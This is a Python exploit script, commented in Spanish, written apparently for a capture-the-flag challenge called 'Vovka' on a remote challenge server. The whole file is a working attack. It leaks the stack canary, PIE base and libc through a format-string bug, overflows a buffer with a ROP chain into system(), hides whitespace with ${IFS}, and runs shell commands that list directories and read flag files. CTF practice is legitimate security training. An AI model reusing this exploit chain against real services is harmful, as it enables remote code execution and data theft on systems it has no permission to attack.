#!/usr/bin/env python3
"""CTF Vovka: mueve la cadena de comando por encima del ROP stack.
Sin pwntools, libc.rip, ni dependencias extra; Termux/Windows/Linux.
"""
import re
import socket
import struct
import time

HOST, PORT = 'challenges2.hackrocks.com', 1021
USER = b'player'
PASSWORD = b'Bl1nd_Fmt_Str1ng_G0!'
CANARY_OFFSET = 328
LEAK_RET = 0x13c5
REENTER = 0x10e0
GOT_PUTS = 0x4000
PUTS_OFF = 0x77980
SYSTEM_OFF = 0x4c490
POP_RDI_OFF = 0x277e5
RET_OFF = 0x27182
# 0x1393: imprime "Access denied." y termina el proceso.
END_OF_CHAIN = 0x1393
BAD = b'\x09\x0a\x0b\x0c\x0d\x20'


def p64(x):
    return struct.pack('<Q', x)


def recvuntil(s, token):
    data = bytearray()
    while token not in data:
        chunk = s.recv(4096)
        if not chunk:
            raise EOFError('Cierre antes de ' + repr(token) + ': ' + repr(bytes(data[-100:])))
        data.extend(chunk)
    return bytes(data)


def signin(s):
    recvuntil(s, b'username:')
    s.sendall(USER + b'\n')
    recvuntil(s, b'password:')
    s.sendall(PASSWORD + b'\n')
    recvuntil(s, b'log>')


def has_whitespace(payload):
    return any(byte in BAD for byte in payload)


def read_output(s):
    chunks = bytearray()
    s.settimeout(0.7)
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline and len(chunks) < 30000:
        try:
            data = s.recv(4096)
        except socket.timeout:
            continue
        if not data:
            break
        chunks.extend(data)
    return bytes(chunks)


def attempt(which, command, align=True):
    with socket.create_connection((HOST, PORT), timeout=7) as s:
        s.settimeout(7)
        signin(s)
        s.sendall(b'K|%47$p|%49$p|E\n')
        initial = recvuntil(s, b'Comments>')
        m = re.search(rb'K\|(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)\|E', initial)
        if not m:
            raise ValueError('No se encontro PIE/canary')
        canary, savedret = (int(x, 16) for x in m.groups())
        pie = savedret - LEAK_RET
        if pie % 4096:
            raise ValueError('Base PIE no alineada')
        restart = b'A' * CANARY_OFFSET + p64(canary) + b'B' * 8 + p64(pie + REENTER)
        if has_whitespace(restart):
            raise ValueError('Separador en canary/reentrada')
        s.sendall(restart + b'\n')
        signin(s)

        fmt = b'L|%3$p|%30$p|%30$.8s|END'
        query = fmt + b'\0' + b'P' * (128 - len(fmt) - 1) + p64(pie + GOT_PUTS)
        if b'\n' in query:
            raise ValueError('Nueva linea en puntero GOT')
        s.sendall(query + b'\n')
        raw = recvuntil(s, b'Comments>')
        m = re.search(rb'L\|(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)\|(.*?)\|END', raw, re.S)
        if not m or int(m[2], 16) != pie + GOT_PUTS:
            raise ValueError('No se pudo leer GOT')
        log_buffer = int(m[1], 16)
        comments_buffer = log_buffer - 0x40
        puts_addr = int.from_bytes(m[3].ljust(8, b'\0'), 'little')
        libc = puts_addr - PUTS_OFF
        if libc % 4096 or not (0x700000000000 <= puts_addr < 0x800000000000):
            raise ValueError('Libc inconsistente')

        # Colocamos el comando DESPUES de los punteros de la cadena ROP,
        # lejos de la pila descendente que utiliza system().
        chain = ([libc + RET_OFF] if align else [])
        chain += [libc + POP_RDI_OFF, 0,
                  libc + (PUTS_OFF if which == 'puts' else SYSTEM_OFF),
                  pie + END_OF_CHAIN]
        chain_start = CANARY_OFFSET + 8 + 8  # indice 344, RIP guardado
        command_offset = chain_start + 8 * len(chain)
        command_pointer = comments_buffer + command_offset
        chain[(1 if align else 0) + 1] = command_pointer
        payload = b'A' * CANARY_OFFSET + p64(canary) + b'B' * 8
        payload += b''.join(p64(word) for word in chain)
        payload += command + b'\0'
        if has_whitespace(payload):
            raise ValueError('Separador en ROP/cadena')
        print(f'  PIE={pie:#x} libc={libc:#x} cmd@{command_pointer:#x} '
              f'offset_cmd={command_offset} align={align}', flush=True)
        s.sendall(payload + b'\n')
        return read_output(s)


def run(which, command, align, maximum=12):
    for count in range(1, maximum + 1):
        try:
            output = attempt(which, command, align)
            print(f'[{which}, align={align}, #{count}] {output[:2500]!r}', flush=True)
            # El mensaje final confirma que la función regresó por la ROP.
            if b'Access denied.' in output or (which == 'system' and b'VOVKA_OK' in output):
                return output
        except (OSError, ValueError, EOFError, RuntimeError) as e:
            print(f'  [{count}] {e}', flush=True)
    return b''


def main():
    print('[*] Vovka: comando despues de ROP (Termux/Python 3)', flush=True)
    cmd = b'echo${IFS}VOVKA_OK'
    check = run('puts', cmd, True, 9)
    if cmd not in check:
        print('[!] Fallo puts; no probaremos system', flush=True)
        return
    print('[+] puts lee bien el comando trasladado.', flush=True)
    for align in (True, False):
        test = run('system', cmd, align, 12)
        if b'VOVKA_OK' in test:
            print('[+] EJECUCION CONFIRMADA. Buscando el indicador...', flush=True)
            commands = (
                b'pwd;ls${IFS}-la;ls${IFS}/',
                b'cat${IFS}./flag*;cat${IFS}/flag*',
                b'cat${IFS}/app/flag*;cat${IFS}/home/*/flag*',
                b'find${IFS}/${IFS}-maxdepth${IFS}3${IFS}-iname${IFS}"*flag*"',
            )
            for command in commands:
                print('[CMD]', command.decode(), flush=True)
                for i in range(1, 10):
                    try:
                        result = attempt('system', command, align)
                        if result:
                            print('[RESPUESTA]', result.decode('utf-8', 'replace'), flush=True)
                            break
                    except (OSError, ValueError, EOFError) as e:
                        print(f'  reintento {i}: {e}', flush=True)
            return
        if b'Access denied.' in test:
            print('[!] system volvio al marcador, pero el shell no imprimio. '
                  'Podria estar bloqueado el spawn.', flush=True)
            return
    print('[!] No funciono system; no continuar con barridos a ciegas.', flush=True)


if __name__ == '__main__':
    main()
